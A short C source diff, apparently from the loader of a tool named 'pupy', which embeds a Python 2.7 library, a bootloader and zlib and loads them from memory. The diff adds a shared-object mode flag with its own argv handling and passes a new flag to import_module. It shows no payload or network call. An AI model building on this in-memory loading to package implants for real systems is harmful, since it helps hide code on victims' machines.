@@ -19,6 +19,7 @@
 
 extern const char resources_python27_so_start[];
 extern const int resources_python27_so_size;
+
 extern const char resources_bootloader_pyc_start[];
 extern const int resources_bootloader_pyc_size;
 
@@ -37,7 +38,7 @@ extern DL_EXPORT(void) initpupy(void);
 	const uint32_t dwPupyArch = 32;
 #endif
 
-uint32_t mainThread(int argc, char *argv[]) {
+uint32_t mainThread(int argc, char *argv[], bool so) {
 
 	int rc = 0;
 	PyObject *m=NULL, *d=NULL, *seq=NULL;
@@ -77,7 +78,16 @@ uint32_t mainThread(int argc, char *argv[]) {
 
 		dprint("SET ARGV\n");
 		if (argc > 0) {
-			PySys_SetArgvEx(argc, argv, 0);
+			if (so) {
+				if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
+					argv[1] = argv[0];
+					PySys_SetArgvEx(argc - 1, argv + 1, 0);
+				} else {
+					PySys_SetArgvEx(1, argv, 0);
+				}
+			} else {
+				PySys_SetArgvEx(argc, argv, 0);
+			}
 		}
 
 		PySys_SetPath(".");
@@ -94,7 +104,7 @@ uint32_t mainThread(int argc, char *argv[]) {
 
 #ifdef _PYZLIB_DYNLOAD
 	dprint("load zlib\n");
-    if (!import_module("initzlib", "zlib", resources_zlib_so_start, resources_zlib_so_size)) {
+    if (!import_module("initzlib", "zlib", resources_zlib_so_start, resources_zlib_so_size, true)) {
         dprint("ZLib load failed.\n");
     }
 #endif
